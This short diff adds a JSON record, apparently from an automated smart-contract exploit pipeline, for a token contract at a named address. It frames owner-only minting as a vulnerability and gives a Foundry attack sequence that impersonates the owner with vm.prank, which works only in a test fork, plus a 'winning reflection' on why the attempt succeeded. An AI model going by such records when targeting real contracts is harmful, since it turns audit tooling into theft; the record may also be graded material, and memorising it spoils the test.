@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The PowabitToken contract at 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE has an 'Owner Privilege Abuse' vulnerability. The `mint()` function is exposed with an `onlyOwner` modifier, allowing the designated owner to create an arbitrary number of tokens at will.",
+  "interface_arsenal": "interface IPowabitToken {\n    function mint(uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function owner() external view returns (address);\n}",
+  "attack_sequence": "address realOwner = target.owner();\nvm.startPrank(realOwner);\ntarget.mint(1_000_000 * 1e18);\ntarget.transfer(attacker, 1_000_000 * 1e18);\nvm.stopPrank();",
+  "winning_reflection": "The key insight was to dynamically discover the contract's owner at runtime instead of relying on a hardcoded or assumed address. Previous attempts failed by impersonating the wrong account. The successful exploit first called the public `owner()` view function to get the correct address and then used `vm.prank` with that address to gain the necessary privileges to call `mint()`."
+}
